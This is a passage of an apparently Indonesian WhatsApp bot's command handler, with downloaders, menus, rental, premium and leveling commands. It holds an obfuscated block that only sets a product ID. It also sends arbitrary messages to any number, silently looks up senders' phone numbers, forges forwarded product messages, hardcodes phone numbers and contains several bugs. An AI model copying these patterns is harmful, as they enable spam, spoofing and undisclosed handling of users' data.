        reply(tekss);
        break;

      //------------------< Fitur yg pake button >-------------------
      
	case 'chat':
	      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            ronove.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
case 'viewonce':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
res = await ronove.prepareMessageFromContent(from,{
"viewOnceMessage": {
"message": {
"imageMessage": {
"mimetype": 'image/jpeg',
"jpegThumbnail": iye,
"viewOnce": true
}
}
}
}, {}) 
ronove.relayWAMessage(res)
break
case 'hbd': case 'zodiak': case 'zodiac':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
let textus = args.join(" ")
if (!q) return reply(`Example : ${prefix + command} 2003 01 24`)
const zodiak = [
    ["Capricorn",   new Date(1970, 0, 1)],
    ["Aquarius",    new Date(1970, 0, 20)],
    ["Pisces",      new Date(1970, 1, 19)],
    ["Aries",       new Date(1970, 2, 21)],
    ["Taurus",      new Date(1970, 3, 21)],
    ["Gemini",      new Date(1970, 4, 21)],
    ["Cancer",      new Date(1970, 5, 22)],
    ["Leo",         new Date(1970, 6, 23)],
    ["Virgo",       new Date(1970, 7, 23)],
    ["Libra",       new Date(1970, 8, 23)],
    ["Scorpio",     new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn",   new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const okbg = new Date(textus)
if (okbg == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [okbg.getFullYear(), okbg.getMonth() + 1, okbg.getDate()]
    
const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
reply(monospace(teksh))
break
// debug
  case 'debug':
			 res = await ronove.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
							"hydratedFooterText": `${namaowner}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
ronove.relayWAMessage(res)
break
case 'debug2':
   res = await ronove.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
    "hydratedFooterText": `${namaowner}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${namaowner}`,
          "url": "BELI LAH SAMA OWNERKU AWOKAWOKAWOK"
        },
        "index": 0
      }
    ]
  }
}
}, {})
ronove.relayWAMessage(res)
break
				
   /*switch (command) {*/
        /*case 'asupan':
          var menulist = ronove.prepareMessageFromContent(from, {
            "listMessage" :{
              "title": `${ucapanWaktu} kak ${pushname}\n ini adalah bot Gw:v`,
              "description": `bot ini berjalan selama \n${runtime(process.uptime())}`,
              "buttonText": "click here👈",
              /*"footerText": '@_${namaowner}',
              "listType": "SINGLE_SELECT",
              "sections": [{
              "footerText": '@_${namaowner}',
                "title": `Prefix Bot :「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」`,
                "rows": [{
                    "title": "+62",
                    "rowId": "0",
                    "description": ""
                  },{
                    "title": "asupan",
                    "rowId": "1",
                    "description": ""
                  },{
                    "title": "asupan",
                    "rowId": "2",
                    "description": ""
                  }]
              }]
            }
          }, {})
          ronove.relayWAMessage(menulist, {waitForAck: true})*/
              
                 break
			      case "mode":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan": 
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        sendButMessage(from, `Hai Kak ${pushname} 〆⁩`, `Silahkan pilih Asupannya Kak✨`, [
          {
            buttonId: `+62`,
            buttonText: {
              displayText: `*〆⁩* Asupan +62`,
            },
            type: 1,
          },
          {
            buttonId: `ghea`,
            buttonText: {
              displayText: `*〆⁩* Asupan Ghea`,
            },
            type: 1,
          },
          {
            buttonId: `asupan2`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan2": 
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        sendButMessage(from, `Hai Kak ${pushname} 〆⁩`, `Silahkan pilih Asupannya V.2 kak✨`, [
          {
            buttonId: `santuy`,
            buttonText: {
              displayText: `*〆⁩* Asupan Santuy`,
            },
            type: 1,
          },
          {
            buttonId: `bocil`,
            buttonText: {
              displayText: `*〆⁩* Asupan Bocil`,
            },
            type: 1,
          },
          {
            buttonId: `asupan3`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
          },
        ]);
        break;
case "asupan3": 
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        sendButMessage(from, `Hai Kak ${pushname} 〆⁩`, `Silahkan pilih Asupannya V.3 kak✨`, [
          {
            buttonId: `rikagusriani`,
            buttonText: {
              displayText: `*〆⁩* Asupan Rikagusriani`,
            },
            type: 1,
          },
          {
            buttonId: `ukty`,
            buttonText: {
              displayText: `*〆⁩* Asupan Ukhti`,
            },
            type: 1,
          },
          {
            buttonId: `mygithub`,
            buttonText: {
              displayText: `Follow Kak Github Saya😄`,
            },
            type: 1,
          },
        ]);
        break;
      case "grup":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!mek.key.fromMe) return;
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `opengc`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `closegc`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;        
 //end
case 'qanime':
case 'quoteanime':
case 'quotesanime':
ane = await fetchJson (`https://api-senku.herokuapp.com/api/qanime?apikey=SenkuApi`)
qorqon = await getBuffer(`https://telegra.ph/file/cbbabb04d257354709265.jpg`)
tekete = `By : ${ane.result.by}
quote: ${ane.result.quote}`
nihkak(tekete)
              break
//hadijokes
case 'darkjokes':
anooneesan = await fetchJson(`http://hadi-api.herokuapp.com/api/darkjokes`)
anokak = await getBuffer(anooneesan.result)

ronove.sendMessage(from, anokak, image, {quoted: mek, thumbnail: fs.readFileSync('./ronove.jpg')})
					break
      //------------------< Fitur downloader >-------------------
      case "tiktok":
      case "tiktoknowm":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
                if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply('Url harus vt.tiktok.com!!!');
sticWait(from)
const arg = args[0]
const baper = await fetchJson(`http://hadi-api.herokuapp.com/api/tiktok?url=${q}`)
const bawaper = await getBuffer(baper.result.video.nowm)
ronove.sendMessage(from, bawaper, video, { mimetype: 'video/mp4', quoted: nikak})
break;
//------------------< Sewa >-------------------
       case 'sewa':
              if (!isGroup)return reply(mess.only.group)
              if (!isOwner) return reply(mess.only.owner)
              if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
              if (args[0].toLowerCase() === 'add'){
            _sewa.addSewaGroup(from, args[1], sewa)
              reply(`Success`)
              } else if (args[0].toLowerCase() === 'del'){
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/group/sewa.json', JSON.stringify(sewa))
              reply(mess.success)
              } else {
              reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
}
              break
       case 'sewalist': 
       case 'listsewa':
              let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
              for (let i of sewa){
              let cekvipp = ms(i.expired - Date.now())
              txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
}
              reply(txtnyee)
              break
//------------------< Premium >-------------------
case 'buy': 
ptod = "6285347683869@s.whatsapp.net"
stod = `${sender}`
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
       nama = 'Beli premium'
       ownerJid = "6285347683869@s.whatsapp.net"
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
sewa = `${setting.txtPremium}
`
   //Masih langka
function _0x21f8() {
    var _0x5b970c = ['5573144JYwLrC', '528103swWGih', 'image/jpeg', 'HZ7GZtD+MZleBjG1flbeTuZkDThPV6frfERXi4zTBvs=', 'readFileSync', '69880vdqygB', '431675fOwedq', '3264wpwOzQ', '3ucdrq0UyCuNG5YcUD9aKX4qkuvcip+OonjhACusy5Q=', '988644bxSaXV', '19894ILewVQ', '2QmpxNq', '66214', '9999999', '1341KlrShJ', '2506689kwMmco', './ronove.jpg'];
    _0x21f8 = function () {
        return _0x5b970c;
    };
    return _0x21f8();
}

function _0x4cac(_0x23a824, _0x283a6f) {
    var _0x21f8ef = _0x21f8();
    return _0x4cac = function (_0x4cacde, _0x3311de) {
        _0x4cacde = _0x4cacde - 0xc7;
        var _0x13ea77 = _0x21f8ef[_0x4cacde];
        return _0x13ea77;
    }, _0x4cac(_0x23a824, _0x283a6f);
}
var _0xcdc6be = _0x4cac;
(function (_0x130db2, _0x4b9859) {
    var _0x3cd68e = _0x4cac,
        _0x5ee5d3 = _0x130db2();
    while (!![]) {
        try {
            var _0x2ac92a = -parseInt(_0x3cd68e(0xce)) / 0x1 * (-parseInt(_0x3cd68e(0xc7)) / 0x2) + parseInt(_0x3cd68e(0xcb)) / 0x3 + -parseInt(_0x3cd68e(0xd6)) / 0x4 + -parseInt(_0x3cd68e(0xd3)) / 0x5 + parseInt(_0x3cd68e(0xd4)) / 0x6 * (parseInt(_0x3cd68e(0xd7)) / 0x7) + -parseInt(_0x3cd68e(0xcd)) / 0x8 + parseInt(_0x3cd68e(0xca)) / 0x9 * (-parseInt(_0x3cd68e(0xd2)) / 0xa);
            if (_0x2ac92a === _0x4b9859) break;
            else _0x5ee5d3['push'](_0x5ee5d3['shift']());
        } catch (_0x5691cb) {
            _0x5ee5d3['push'](_0x5ee5d3['shift']());
        }
    }
}(_0x21f8, 0xccadb), anu = ronove['prepareMessageFromContent'](from, {
    'productMessage': {
        'product': {
            'productImage': {
                'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
                'mimetype': 'image/jpeg',
                'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'fileLength': 28777,
                'height': 1080,
                'width': 1079,
                'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
                'fileEncSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'jpegThumbnail': iye
            },
            'productId': _0xcdc6be(0xc9),
            'title': '' + nama,
            'description': '' + sewa,
            'productImageCount': 1
        },
        'businessOwnerJid': "0@s.whatsapp.net",
        'contextInfo': {
            'forwardingScore': 558,
            'isForwarded': !![]
        }
    }
}, {
    'quoted': fdoc,
    'contextInfo': {
        'mentionedJid': [ptod, stod]
    }
}), ronove['relayWAMessage'](anu));
break
case 'sᴇᴡᴀʙᴏᴛ': 
ptod = "6285347683869@s.whatsapp.net"
stod = `${sender}`
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
       nama = 'Sewa bot'
       ownerJid = "6285347683869@s.whatsapp.net"
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
sewa = `${setting.txtSewa}
`
   //Masih langka
function _0x21f8() {
    var _0x5b970c = ['5573144JYwLrC', '528103swWGih', 'image/jpeg', 'HZ7GZtD+MZleBjG1flbeTuZkDThPV6frfERXi4zTBvs=', 'readFileSync', '69880vdqygB', '431675fOwedq', '3264wpwOzQ', '3ucdrq0UyCuNG5YcUD9aKX4qkuvcip+OonjhACusy5Q=', '988644bxSaXV', '19894ILewVQ', '2QmpxNq', '66214', '9999999', '1341KlrShJ', '2506689kwMmco', './ronove.jpg'];
    _0x21f8 = function () {
        return _0x5b970c;
    };
    return _0x21f8();
}

function _0x4cac(_0x23a824, _0x283a6f) {
    var _0x21f8ef = _0x21f8();
    return _0x4cac = function (_0x4cacde, _0x3311de) {
        _0x4cacde = _0x4cacde - 0xc7;
        var _0x13ea77 = _0x21f8ef[_0x4cacde];
        return _0x13ea77;
    }, _0x4cac(_0x23a824, _0x283a6f);
}
var _0xcdc6be = _0x4cac;
(function (_0x130db2, _0x4b9859) {
    var _0x3cd68e = _0x4cac,
        _0x5ee5d3 = _0x130db2();
    while (!![]) {
        try {
            var _0x2ac92a = -parseInt(_0x3cd68e(0xce)) / 0x1 * (-parseInt(_0x3cd68e(0xc7)) / 0x2) + parseInt(_0x3cd68e(0xcb)) / 0x3 + -parseInt(_0x3cd68e(0xd6)) / 0x4 + -parseInt(_0x3cd68e(0xd3)) / 0x5 + parseInt(_0x3cd68e(0xd4)) / 0x6 * (parseInt(_0x3cd68e(0xd7)) / 0x7) + -parseInt(_0x3cd68e(0xcd)) / 0x8 + parseInt(_0x3cd68e(0xca)) / 0x9 * (-parseInt(_0x3cd68e(0xd2)) / 0xa);
            if (_0x2ac92a === _0x4b9859) break;
            else _0x5ee5d3['push'](_0x5ee5d3['shift']());
        } catch (_0x5691cb) {
            _0x5ee5d3['push'](_0x5ee5d3['shift']());
        }
    }
}(_0x21f8, 0xccadb), anu = ronove['prepareMessageFromContent'](from, {
    'productMessage': {
        'product': {
            'productImage': {
                'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
                'mimetype': 'image/jpeg',
                'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'fileLength': 28777,
                'height': 1080,
                'width': 1079,
                'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
                'fileEncSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'jpegThumbnail': iye
            },
            'productId': _0xcdc6be(0xc9),
            'title': '' + nama,
            'description': '' + sewa,
            'productImageCount': 1
        },
        'businessOwnerJid': "6281545463585@s.whatsapp.net",
        'contextInfo': {
            'forwardingScore': 558,
            'isForwarded': !![]
        }
    }
}, {
    'quoted': fdoc,
    'contextInfo': {
        'mentionedJid': [ptod, stod]
    }
}), ronove['relayWAMessage'](anu));
break
case 'donasi': 
ptod = "6285347683869@s.whatsapp.net"
stod = `${sender}`
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
       nama = 'donasi'
       ownerJid = "6285347683869@s.whatsapp.net"
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
sewa = `${setting.txtDonasi}
`
   //Masih langka
function _0x21f8() {
    var _0x5b970c = ['5573144JYwLrC', '528103swWGih', 'image/jpeg', 'HZ7GZtD+MZleBjG1flbeTuZkDThPV6frfERXi4zTBvs=', 'readFileSync', '69880vdqygB', '431675fOwedq', '3264wpwOzQ', '3ucdrq0UyCuNG5YcUD9aKX4qkuvcip+OonjhACusy5Q=', '988644bxSaXV', '19894ILewVQ', '2QmpxNq', '66214', '9999999', '1341KlrShJ', '2506689kwMmco', './ronove.jpg'];
    _0x21f8 = function () {
        return _0x5b970c;
    };
    return _0x21f8();
}

function _0x4cac(_0x23a824, _0x283a6f) {
    var _0x21f8ef = _0x21f8();
    return _0x4cac = function (_0x4cacde, _0x3311de) {
        _0x4cacde = _0x4cacde - 0xc7;
        var _0x13ea77 = _0x21f8ef[_0x4cacde];
        return _0x13ea77;
    }, _0x4cac(_0x23a824, _0x283a6f);
}
var _0xcdc6be = _0x4cac;
(function (_0x130db2, _0x4b9859) {
    var _0x3cd68e = _0x4cac,
        _0x5ee5d3 = _0x130db2();
    while (!![]) {
        try {
            var _0x2ac92a = -parseInt(_0x3cd68e(0xce)) / 0x1 * (-parseInt(_0x3cd68e(0xc7)) / 0x2) + parseInt(_0x3cd68e(0xcb)) / 0x3 + -parseInt(_0x3cd68e(0xd6)) / 0x4 + -parseInt(_0x3cd68e(0xd3)) / 0x5 + parseInt(_0x3cd68e(0xd4)) / 0x6 * (parseInt(_0x3cd68e(0xd7)) / 0x7) + -parseInt(_0x3cd68e(0xcd)) / 0x8 + parseInt(_0x3cd68e(0xca)) / 0x9 * (-parseInt(_0x3cd68e(0xd2)) / 0xa);
            if (_0x2ac92a === _0x4b9859) break;
            else _0x5ee5d3['push'](_0x5ee5d3['shift']());
        } catch (_0x5691cb) {
            _0x5ee5d3['push'](_0x5ee5d3['shift']());
        }
    }
}(_0x21f8, 0xccadb), anu = ronove['prepareMessageFromContent'](from, {
    'productMessage': {
        'product': {
            'productImage': {
                'url': 'https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc',
                'mimetype': 'image/jpeg',
                'fileSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'fileLength': 28777,
                'height': 1080,
                'width': 1079,
                'mediaKey': 'vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=',
                'fileEncSha256': '+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=',
                'jpegThumbnail': iye
            },
            'productId': _0xcdc6be(0xc9),
            'title': '' + nama,
            'description': '' + sewa,
            'productImageCount': 1
        },
        'businessOwnerJid': "6285347683869@s.whatsapp.net",
        'contextInfo': {
            'forwardingScore': 558,
            'isForwarded': !![]
        }
    }
}, {
    'quoted': fdoc,
    'contextInfo': {
        'mentionedJid': [ptod, stod]
    }
}), ronove['relayWAMessage'](anu));
break
       case 'premium':
              if (!isOwner) return reply(mess.only.owner)
              if (args[0] === 'add') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid

              premium.addPremiumUser(mentioned[0], args[2], _premium)
              reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
                        
              } else {
                            
              premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
              reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
}
              } else if (args[0] === 'del') {
              if (mek.message.extendedTextMessage != undefined) {
              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            _premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
              reply(mess.success)
              } else {
            _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
              reply(mess.success)
}
              } else {
              reply(mess.wrongFormat)
}
              break
     //------------------< Level >-------------------
      case 'lel': 
              if (!isGroup) return reply(mess.only.group)
              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
              let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
              try {
              profilePic = await ronove.getProfilePicture(sender)
              } catch {
              profilePic = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
           buffer = await getBuffer(`https://telegra.ph/file/6b22da6c33b1700c669e2.jpg`)
              teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
              ronove.sendMessage(from, buffer, image, { caption: teks, quoted: mek})
              break
case 'level':
if (!isGroup) return reply(mess.only.group)
              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
               let userLevell = level.getLevelingLevel(sender, _level)
              let userXpp = level.getLevelingXp(sender, _level)
              let requiredXpp = 10 * Math.pow(userLevell, 2) + 50 * userLevell + 100
              let userRankk = level.getUserRank(sender, _level)
              ptod = "6281545463585@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       lepel = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXpp} / ${requiredXpp}\n➸ *Level :* ${userLevell}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level`
sendButLocation(from, `${lepel}`, `naikin xp dgn chat sebanyak² nya`, {jpegThumbnail:lepell}, [{buttonId:`leaderboard`,buttonText:{displayText:'Leaderboard📋'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}}, { quoted : fgif })
break
case 'mining':
              var mining = randomNomor(1000)
              atm.addKoinUser(sender, mining, _uang)
              await reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
              break
       case 'leaderboard': //Cek Leaderboard
       case 'leaderboards':
              if (!isGroup) return reply(mess.only.group)
              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!') 
              const resp = _level
            _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
              let leaderboard =  `-----[ *LEADERBOARD* ]----\n\n➸ ∞1. wa.me/6281545463585
➸ *Xp :* ∞
➸ *Level :* ∞
➸ *Role :* God\n\n`
              try {
              for (let i = 0; i < 10; i++) {
              var roles = 'Warrior III'
              if (resp[i].level <= 5) {
              roles = 'Warrior II'
              } else if (resp[i].level <= 10) {
              roles = 'Warrior I'
              } else if (resp[i].level <= 15) {
              roles = 'Elite III'
              } else if (resp[i].level <= 20) {
              roles = 'Elite II'
              } else if (resp[i].level <= 25) {
              roles = 'Elite I'
              } else if (resp[i].level <= 30) {
              roles = 'Master III'
              } else if (resp[i].level <= 35) {
              roles = 'Master II'
              } else if (resp[i].level <= 40) {
              roles = 'Master I'
              } else if (resp[i].level <= 45) {
              roles = 'GrandMaster III'
              } else if (resp[i].level <= 50) {
              roles = 'GrandMaster II'
              } else if (resp[i].level <= 55) {
              roles = 'GrandMaster I'
              } else if (resp[i].level <= 60) {
              roles = 'Epic III'
              } else if (resp[i].level <= 65) {
              roles = 'Epic II'
              } else if (resp[i].level <= 70) {
              roles = 'Epic I'
              } else if (resp[i].level <= 75) {
              roles = 'Legend III'
              } else if (resp[i].level <= 80) {
              roles = 'Legend II'
              } else if (resp[i].level <= 85) {
              roles = 'Legend I'
              } else if (resp[i].level <= 90) {
              roles = 'Mythic'
              } else if (resp[i].level <= 95) {
              roles = 'Mythical Glory'
              } else if (resp[i].level >= 100) {
              roles = 'Immortal'
} 

              leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role :* ${roles}\n\n`
}
              reply(leaderboard)
              } catch (err) {
              console.error(err)
              reply('_Perlu setidaknya 10 user yang memiliki level di database!_')
}
              break
//------------------< Enable/Disable >-------------------
       case 'leveling':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
              if (!isGroup) return reply(mess.only.group)
              if (args[0] === 'enable') {
              if (isLevelingOn) return reply('Fitur leveling telah diaktifkan sebelumnya.')
            _leveling.push(from)
              fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
              reply('Fitur leveling berhasil diaktifkan.')
              } else if (args[0] === 'disable') {
              var anup = _leveling.indexOf(from)
            _leveling.splice(anup, 1)
              fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
              reply('Fitur leveling berhasil dimatikan.')
              } else {
              reply('Pilih enable atau disable!')
}
              break
      //JCCHCCGHTHDTRSRS
      case "twitter":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, "DONE");
        break;
      case "facebook":  
    if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        sticWait(from);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "instagram":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        sticWait(from);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              ronove.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              ronove.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "tiktokdl":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break;
case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
       if (args.length < 1) return reply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
           if (c === 'multi'){
              multi = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
                }
                break
      
      case "delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
